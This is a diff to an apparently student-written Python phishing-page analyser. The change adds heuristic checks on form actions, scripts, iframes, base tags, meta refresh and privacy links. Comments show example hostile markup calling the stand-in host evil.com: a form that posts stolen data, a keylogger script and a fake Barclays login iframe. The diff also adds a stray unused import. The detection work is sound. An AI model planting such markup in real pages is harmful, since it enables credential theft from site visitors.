@@ -1,6 +1,7 @@
 #bs4 (BeautifulSoup) is a Python library used for web scraping and parsing HTML and XML documents. 
 #requests is a Python library used for making HTTP requests.
 
+from pydoc import text
 import sqlite3
 from bs4 import BeautifulSoup
 import requests
@@ -101,6 +102,7 @@ def HTML_tag_analyser(HTML_raw, domain):
     #Iterates through all the form tags in the parsed HTML.
     #Gets the value of the action attribute of the form tag. The action attribute specifies where the form data should be sent when the form is submitted.
     #If actiontio attribute exists and does not contain the domain of URL being analysed and it starts with "http", it is considered suspicious because it indicates that the form is submitting data to an external site.
+    #example - <form action="https://evil.com/steal-data">
     for form in filtered.find_all('form'):
         action = form.get('action', '')
         if action and domain not in action and action.startswith('http'):
@@ -109,6 +111,7 @@ def HTML_tag_analyser(HTML_raw, domain):
 
     #Iterates through all the script tags in the parsed HTML.
     #Get value of src attribute of the script tag. The src attribute specifies the URL of an external script file.        
+    #example - <script src="https://evil.com/keylogger.js"></script>
     for script in filtered.find_all('script'):
         src = script.get('src', '')
         if src and domain not in src and src.startswith('http'):
@@ -118,6 +121,7 @@ def HTML_tag_analyser(HTML_raw, domain):
     #Iterates through all the iframe tags in the parsed HTML.
     #Iframes are tool for including a cloned legitimate page (a real bank login) inside a phishing website.
     #Get value of isrc attribute of the iframe tag. The isrc attribute specifies the URL of an external iframe content.
+    #example - <iframe src="https://evil.com/fake-barclays-login"></iframe>
     for iframe in filtered.find_all('iframe'):
         isrc = iframe.get('src', '')
         if isrc and domain not in isrc:
@@ -127,10 +131,40 @@ def HTML_tag_analyser(HTML_raw, domain):
 
     #Iterates through all the base tags in the parsed HTML.
     #base tag sets default URL for all link on page. if base tag points to external website, it can be used to send password from login form to the attacker's server instead of the real bank.
-    #Get value of href attribute of the base tag.       
+    #Get value of href attribute of the base tag.
+    #example - <base href="https://evil.com/">       
     for base in filtered.find_all('base'):
         href = base.get('href', '')
         if href and domain not in href and href.startswith('http'):
             score = score + 18
             matched_tags.append(('base', href))
-        
+
+
+    #meta tag with http-equiv="refresh" can be used to automatically redirect users to another page after a certain amount of time. 
+    #if the content attribute of meta tag doesnt contain the domain of the URL being analysed, it may be considered that the page is trying to redirect users to an external site.
+    #example - <meta http-equiv="refresh" content="0; url=https://evil.com/fake-login">
+    for meta in filtered.find_all('meta'):
+        http_eq = meta.get('http-equiv', '')
+        content = meta.get('content', '')
+        if http_eq.lower() == 'refresh' and domain not in content:
+            score = score + 12 
+            matched_tags.append(('Auto redirect meta refresh', 'High', 12))
+    
+
+    #Iterates through all the anchor tags in the parsed HTML.
+    #Get value of href attribute of the anchor tag. The href attribute specifies the URL of the link.
+    #if the href attribute contains the domain of the URL being analysed, it is considered a legitimate link.
+    #example - <a href="/privacy-policy">Privacy Policy</a>
+    for base2 in filtered.find_all('a'):
+        href = base2.get('href', '')
+        text = base2.get_text().lower()
+        if 'privacy' in text:
+            if domain in href:
+                score = score - 5
+                matched_tags.append(('Privacy link', 'Low', -5))
+            else:
+                score = score + 5
+                matched_tags.append(('Suspicious privacy link', 'High', 5))
+
+    return score, matched_tags
+    
